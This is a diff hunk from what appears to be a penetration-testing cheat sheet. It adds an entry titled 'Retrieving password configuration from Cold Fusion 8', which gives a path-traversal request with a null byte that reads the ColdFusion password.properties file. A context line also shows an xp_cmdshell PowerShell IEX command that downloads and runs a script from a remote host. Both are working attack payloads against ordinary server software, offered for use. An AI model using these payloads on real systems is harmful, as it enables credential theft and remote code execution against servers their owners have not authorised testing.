@@ -517,6 +517,12 @@ xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring("http://<IP>
 ### Adobe Cold Fusion
 https://www.carnal0wnage.com/papers/LARES-ColdFusion.pdf
 
+### Retrieving password configuration from Cold Fusion 8
+```
+Retrieving the credentials from the coldfusion configuration file.
+/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+```
+
 ### Exploiting Cold Fusion 8 (Authenticated)
 
 ```
